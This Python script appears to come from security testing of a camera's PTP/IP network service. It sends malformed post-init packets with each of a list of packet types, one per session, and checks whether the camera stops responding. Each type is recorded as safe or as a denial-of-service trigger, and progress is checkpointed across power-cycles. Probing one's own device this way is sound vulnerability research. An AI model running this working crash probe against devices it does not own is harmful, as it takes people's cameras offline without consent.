#!/usr/bin/env python3
"""Properly characterize the post-init DoS by testing every candidate
ptype in its OWN fresh-camera session. Uses a checkpoint file so we
can resume across power-cycles without losing progress.

Workflow:
  1. Run the script. It picks up where it left off and tests the
     next untested ptype.
  2. For each ptype:
     - Baseline health check (assert camera is up + responsive)
     - Establish valid Init handshake
     - Send one malformed post-init container with that ptype
     - Health check via fresh independent PTP session
     - Mark ptype as SAFE or BROKEN in checkpoint
  3. If a ptype is BROKEN: script exits and asks for a power-cycle.
     User power-cycles, runs the script again, which resumes at the
     NEXT ptype (skipping the one we just broke).
  4. SAFE ptypes can be chained in one session — no reboot needed.

Each script run makes maximal forward progress until either:
  - All ptypes characterized (done), OR
  - A BROKEN ptype is hit (asks for power-cycle).

Checkpoint: /tmp/ptp_p3_checkpoint.json
"""
from __future__ import annotations
import json, os, socket, struct, sys, time
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from larkfly import Camera
from larkfly import types as t
from larkfly import protocol as p

HOST = '192.168.1.1'
BIND = '192.168.1.10'
CHECKPOINT = '/tmp/ptp_p3_checkpoint.json'

# All candidate ptypes to test, in order. ptype=0 already confirmed broken.
CANDIDATES = [
    (0,          'pt=0 (already known BROKEN)'),
    (1,          'InitCmdReq'),
    (2,          'InitCmdAck'),
    (3,          'InitEvtReq'),
    (4,          'InitEvtAck'),
    (5,          'InitFail'),
    (8,          'Event'),
    (9,          'StartData'),
    (10,         'Data'),
    (11,         'Cancel'),
    (12,         'EndData'),
    (13,         'ProbeReq'),
    (14,         'ProbeResp'),
    (15,         'pt=15 (undefined)'),
    (99,         'pt=99 (undefined)'),
    (255,        'pt=255 (undefined)'),
    (0x10000,    'pt=0x10000 (> u16)'),
    (0xFFFFFFFF, 'pt=0xFFFFFFFF (max u32)'),
]


def load_checkpoint() -> dict:
    if not os.path.exists(CHECKPOINT):
        return {'results': {}}
    return json.load(open(CHECKPOINT))


def save_checkpoint(cp: dict):
    json.dump(cp, open(CHECKPOINT, 'w'), indent=2)


def fresh_socket(timeout: float = 4.0) -> socket.socket:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((BIND, 0))
    s.settimeout(timeout)
    s.connect((HOST, 15740))
    return s


def container(ptype: int, payload: bytes) -> bytes:
    return struct.pack('<II', 8 + len(payload), ptype) + payload


def health() -> tuple[bool, str]:
    try:
        c = Camera(HOST, bind=BIND, timeout=5)
        c.connect()
        info = c.device_info()
        c.close()
        return True, f"OK ({len(info['device_properties_supported'])} props)"
    except Exception as e:
        return False, f"DOWN ({type(e).__name__})"


def send_one(ptype: int) -> str:
    """One session: InitCmdReq → ack → send malformed op-pkt → close."""
    init_payload = p.encode_init_cmd_req(b'\x00'*16, 'localhost')
    op_body = struct.pack('<I', 1) + struct.pack('<H', 0x1001) + struct.pack('<I', 1)
    s = fresh_socket()
    try:
        s.sendall(container(t.PT_INIT_CMD_REQ, init_payload))
        hdr = s.recv(8)
        if len(hdr) < 8:
            return f'init-short ({len(hdr)}B)'
        length, ack_pt = struct.unpack('<II', hdr)
        _ = s.recv(length - 8)
        if ack_pt != t.PT_INIT_CMD_ACK:
            return f'init-failed (ptype={ack_pt})'
        s.sendall(container(ptype, op_body))
        try:
            resp = b''
            while True:
                chunk = s.recv(4096)
                if not chunk: break
                resp += chunk
                if len(resp) > 1024: break
            return 'closed-by-peer' if not resp else f'got {len(resp)}B'
        except socket.timeout:
            return 'recv-timeout'
    finally:
        try: s.close()
        except Exception: pass


def main():
    cp = load_checkpoint()
    results = cp['results']

    # Mark ptype=0 as known-broken if not already
    if '0' not in results:
        results['0'] = {'status': 'BROKEN', 'send': 'known from prior session',
                        'note': 'recv-timeout + camera DoS confirmed 1/1'}
        save_checkpoint(cp)

    # Baseline check
    ok, diag = health()
    print(f"[*] Baseline: {diag}")
    if not ok:
        print("Camera unhealthy at start. Power-cycle and re-run.")
        return 1

    print(f"[*] Checkpoint loaded — {len(results)} ptypes already characterized")
    print()

    # Find next untested ptype
    for ptype, name in CANDIDATES:
        key = str(ptype)
        if key in results:
            status = results[key]['status']
            print(f"  [SKIP] ptype={ptype} ({name}) — already {status}")
            continue

        print(f"\n  [TEST] ptype={ptype} ({name})")
        send_status = send_one(ptype)
        time.sleep(0.5)
        ok, diag = health()
        result_status = 'SAFE' if ok else 'BROKEN'
        results[key] = {
            'status': result_status,
            'send': send_status,
            'post_health': diag,
        }
        save_checkpoint(cp)
        print(f"    send={send_status}")
        print(f"    health={diag}")
        print(f"    → {result_status}")

        if not ok:
            print(f"\n  ★★★ ptype={ptype} ({name}) is a DoS trigger.")
            print(f"      Power-cycle the camera, then re-run this script to continue.")
            print(f"      Checkpoint saved — will skip this ptype + already-tested ones.")
            return 0

    # All done
    print("\n" + "="*72)
    print("ALL PTYPES CHARACTERIZED")
    print("="*72)
    broken = sorted([(int(k), results[k]) for k in results if results[k]['status'] == 'BROKEN'])
    safe   = sorted([(int(k), results[k]) for k in results if results[k]['status'] == 'SAFE'])
    print(f"\nBROKEN ({len(broken)}):")
    for pt, r in broken:
        name = next((n for p, n in CANDIDATES if p == pt), '?')
        print(f"  ptype={pt:>5} ({name}) — send={r['send']}")
    print(f"\nSAFE ({len(safe)}):")
    for pt, r in safe:
        name = next((n for p, n in CANDIDATES if p == pt), '?')
        print(f"  ptype={pt:>5} ({name}) — send={r['send']}")
    return 0


if __name__ == '__main__':
    sys.exit(main())
